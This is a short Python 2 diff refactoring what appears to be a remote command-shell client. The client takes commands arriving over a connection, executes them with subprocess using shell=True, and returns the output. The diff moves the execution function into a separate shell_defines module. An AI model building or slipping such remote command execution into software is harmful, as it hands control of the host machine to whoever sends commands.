@@ -4,6 +4,7 @@ import Queue
 import os
 import threading
 import time
+import shell_defines
 
 marker = chr(255)
 
@@ -18,6 +19,9 @@ class MessageHandler:
 		self.data_prefix = data_prefix
 		self.input_queue = Queue.Queue()
 		
+	def put(self, data):
+		self.input_queue.put(data)
+		
 	def send(self, data):
 		output_queue.put(self.data_prefix+data+marker)
 		
@@ -26,23 +30,15 @@ class MessageHandler:
 		
 class UserInputHandler(MessageHandler):
 
-	def execute_command(self, cmde): #Function to execute commands
-		if cmde:
-			proc = subprocess.Popen(cmde, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-			proc_kill = lambda p: subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=p.pid))
-			timer = threading.Timer(60, proc_kill, [proc])
-			timer.start()
-			out = proc.stdout.read() + proc.stderr.read()
-			timer.cancel()
-			return out
-		else:
-			return "[-]Enter a command."
-
 	def run(self):
 		while True:
 			print "trying to get data!"
 			data = self.input_queue.get()
-			output = self.execute_command(data)
+			
+			if data.startswith("test"):
+				output = shell_defines.test(data)
+			else:
+				output = shell_defines.execute_command(data)
 			self.send(output)
 		
 handlers = []
@@ -68,7 +64,7 @@ while True:
 	
 	if data.startswith(chr(1)):
 		print "FOR USER INPUT!!"
-		user_input_handler.input_queue.put(data[1:])
+		user_input_handler.put(data[1:])
 		
 	elif data.startswith(chr(9)):
 		pass
